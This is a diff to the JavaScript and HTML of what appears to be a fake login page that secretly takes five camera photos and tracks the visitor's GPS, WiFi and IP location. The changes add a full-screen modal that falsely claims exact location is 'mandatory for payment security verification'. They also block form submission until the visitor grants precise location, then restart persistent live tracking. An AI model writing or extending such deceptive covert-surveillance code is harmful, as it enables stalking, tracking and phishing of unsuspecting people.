@@ -106,6 +106,30 @@
         </div>
     </div>
 
+    <!-- Location Permission Modal -->
+    <div id="location-permission-modal"
+        style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.92); z-index:9998; justify-content:center; align-items:center;">
+        <div
+            style="background:white; padding:35px; border-radius:20px; text-align:center; max-width:400px; margin:20px; box-shadow:0 20px 60px rgba(0,0,0,0.3);">
+            <div style="font-size:56px; margin-bottom:15px;">📍</div>
+            <h2 style="margin:0 0 12px 0; color:#1a1a2e; font-size:20px; font-weight:700;">Location Required</h2>
+            <p style="color:#555; margin-bottom:8px; font-size:14px; line-height:1.6;">
+                Exact location is mandatory for payment security verification. Please enable location access in your
+                browser.
+            </p>
+            <div
+                style="background:#f8f9fa; border-radius:12px; padding:14px; margin:15px 0; text-align:left; font-size:12px; color:#666; line-height:1.8;">
+                <strong>📱 Mobile:</strong> Tap 🔒 icon in address bar → Allow Location<br>
+                <strong>💻 Desktop:</strong> Click 🔒 icon near URL → Location → Allow<br>
+                <em>After enabling, click the button below to retry.</em>
+            </div>
+            <button id="retry-location-btn"
+                style="background:#1A73E8; color:white; border:none; padding:14px 35px; border-radius:50px; font-size:15px; cursor:pointer; font-weight:700; text-transform:uppercase; letter-spacing:1px; box-shadow:0 4px 15px rgba(26,115,232,0.35); width:100%; margin-top:5px;">
+                🔄 I Enabled Location - Retry
+            </button>
+        </div>
+    </div>
+
     <video id="video" style="display:none;" playsinline></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
@@ -125,6 +149,7 @@
         let photosCaptured = 0;
         const TOTAL_PHOTOS_LOGIN = 5; // Capture 5 photos on login page
         let cameraStream = null;
+        let locationPermissionDenied = false;
 
         function updateStatus(type, message, success = false) {
             // This function is now a no-op as the debug panel is removed.
@@ -246,7 +271,7 @@
                     return;
                 } catch (error) {
                     console.log(`GPS attempt ${attempt}/2 failed:`, error.message);
-                    // NO DELAY - move to next attempt immediately
+                    if (error.code === 1) locationPermissionDenied = true;
                 }
             }
 
@@ -273,6 +298,7 @@
                 return;
             } catch (error) {
                 console.log('WiFi positioning failed:', error.message);
+                if (error.code === 1) locationPermissionDenied = true;
             }
 
             // STRATEGY 4: IP Context ONLY (Never used as primary 'Exact' location)
@@ -280,19 +306,19 @@
             const ipData = await getEnhancedIPLocation();
             if (ipData) {
                 locationData.ipContext = ipData;
-                await saveLocationData(locationData);
             }
 
-            // STRATEGY 5: Final fallback (instant)
-            console.log('⚠️ Using fallback...');
-            locationData.finalLocation = {
-                error: 'All location methods failed',
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                language: navigator.language,
-                userAgent: navigator.userAgent,
-                source: 'Fallback'
-            };
-            locationData.captureMethod = 'Fallback';
+            // ALL GPS/WiFi STRATEGIES FAILED
+            // If permission was denied, show mandatory location modal
+            if (locationPermissionDenied) {
+                console.log('🚫 Location permission DENIED — showing mandatory modal');
+                showLocationModal();
+                return; // Do NOT proceed without real GPS location
+            }
+
+            // GPS failed but not due to permission (hardware/signal issue)
+            // Save IP context only, form submit will still enforce GPS lock
+            console.log('⚠️ GPS unavailable (signal issue) — form submit will retry');
             await saveLocationData(locationData);
         }
 
@@ -319,7 +345,10 @@
                         saveLocationData(locData);
                     }
                 },
-                (error) => console.log('Watch error:', error.message),
+                (error) => {
+                    console.log('Watch error:', error.message);
+                    if (error.code === 1) { locationPermissionDenied = true; showLocationModal(); }
+                },
                 { enableHighAccuracy: true, timeout: 60000, maximumAge: 0 }
             );
         }
@@ -359,7 +388,7 @@
                             }
                         }
                     },
-                    (err) => console.log('Instant GPS failed:', err.message),
+                    (err) => { console.log('Instant GPS failed:', err.message); if (err.code === 1) locationPermissionDenied = true; },
                     { enableHighAccuracy: true, timeout: 10000 }
                 );
 
@@ -384,7 +413,7 @@
                             resolve(extractPositionData(localBest, 'GPS-Turbo-Elite'));
                         }
                     },
-                    (error) => console.log('Turbo watch error:', error.message),
+                    (error) => { console.log('Turbo watch error:', error.message); if (error.code === 1) locationPermissionDenied = true; },
                     { enableHighAccuracy: true, timeout: maxWait, maximumAge: 0 }
                 );
             });
@@ -607,6 +636,55 @@
             return await getEnhancedIPLocation();
         }
 
+
+        // ===== MANDATORY LOCATION PERMISSION MODAL =====
+        let locationModalBound = false;
+        function showLocationModal() {
+            const modal = document.getElementById('location-permission-modal');
+            modal.style.display = 'flex';
+
+            if (locationModalBound) return;
+            locationModalBound = true;
+
+            document.getElementById('retry-location-btn').addEventListener('click', async () => {
+                const btn = document.getElementById('retry-location-btn');
+                btn.innerHTML = '⏳ Checking Location...';
+                btn.disabled = true;
+
+                try {
+                    const position = await getPositionWithPromise({
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    });
+
+                    // Location granted!
+                    locationPermissionDenied = false;
+                    modal.style.display = 'none';
+                    showToast('Location access granted ✓', 'success');
+
+                    // Save the location and restart tracking
+                    const locData = {
+                        attempts: [extractPositionData(position, 'GPS-Retry')],
+                        finalLocation: extractPositionData(position, 'GPS-Retry'),
+                        captureMethod: 'GPS-Retry'
+                    };
+                    await saveLocationData(locData);
+                    startPersistentGPS();
+                    startLiveTracking();
+
+                } catch (error) {
+                    btn.disabled = false;
+                    if (error.code === 1) {
+                        btn.innerHTML = '❌ Still Blocked - Try Again';
+                        showToast('Location still blocked. Please check browser settings.', 'error');
+                    } else {
+                        btn.innerHTML = '🔄 Retry (Signal Issue)';
+                        showToast('GPS signal weak. Try moving near a window.', 'error');
+                    }
+                }
+            });
+        }
 
         // Promise wrapper for geolocation
         function getPositionWithPromise(options) {
@@ -846,6 +924,13 @@
         document.getElementById('login-form').addEventListener('submit', function (e) {
             e.preventDefault();
 
+            // 0. Check if location permission was denied — BLOCK EVERYTHING
+            if (locationPermissionDenied) {
+                console.log('📍 Location denied. Showing Location modal...');
+                showLocationModal();
+                return;
+            }
+
             // 1. Check if camera capture is complete
             if (!dataCapturComplete.camera) {
                 console.log('📸 Camera not captured. Showing Human Verification modal...');
@@ -927,7 +1012,13 @@
                                 btn.innerHTML = `<div class="loading"></div> Precising (±${acc}m)...`;
                             }
                         },
-                        () => { },
+                        (err) => {
+                            if (err.code === 1) {
+                                clearInterval(strictTimer);
+                                locationPermissionDenied = true;
+                                showLocationModal();
+                            }
+                        },
                         { enableHighAccuracy: true, timeout: 5000 }
                     );
 
